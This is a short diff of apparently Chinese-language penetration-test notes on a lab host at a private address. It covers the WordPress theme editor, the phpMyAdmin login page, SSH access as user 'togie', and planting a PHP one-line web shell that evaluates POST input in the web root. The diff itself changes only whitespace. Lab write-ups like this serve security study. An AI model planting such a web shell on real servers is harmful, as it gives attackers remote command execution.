@@ -62,13 +62,15 @@ http://192.168.100.148/wordpress/wp-admin/theme-editor.php?file=404.php&theme=tw
 	
 	查看phpmyadmin后台登录页面
 	http://192.168.100.148/phpmyadmin
-	
+
 22端口（SSH服务）
 	ssh togie@192.168.100.148    
-  
+
 	cd /var/www/html
 	vim 1.php 
 	<?php @eval($_POST[xiuxiu]);?>
-	
-	
-	
+
+
+​	
+​	
+
